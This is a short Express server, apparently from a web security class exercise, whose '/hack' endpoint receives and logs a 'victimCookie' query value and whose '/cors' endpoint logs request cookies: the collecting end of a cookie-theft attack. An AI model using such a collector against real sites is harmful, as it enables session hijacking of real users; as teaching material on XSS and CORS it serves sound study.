const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");

const port = parseInt(process.env.PORT, 10) || 3001;

const app = express();

// parse application/json
app.use(bodyParser.json());
app.use(cors());

app.get("/hack", (req, res) => {
  const { victimCookie } = req.query;
  console.log("Victim Cookie: ", victimCookie);
  res.status(200).send(
    JSON.stringify({
      subject: "ddss",
      year: 2019,
    })
  );
});

app.get("/cors", (req, res) => {
  console.log("Cookies: ", req.cookies);
  res.json({
    subject: "ddss",
    year: 2019,
  });
});

app.listen(port, () => console.log(`Example app listening on port ${port}!`));
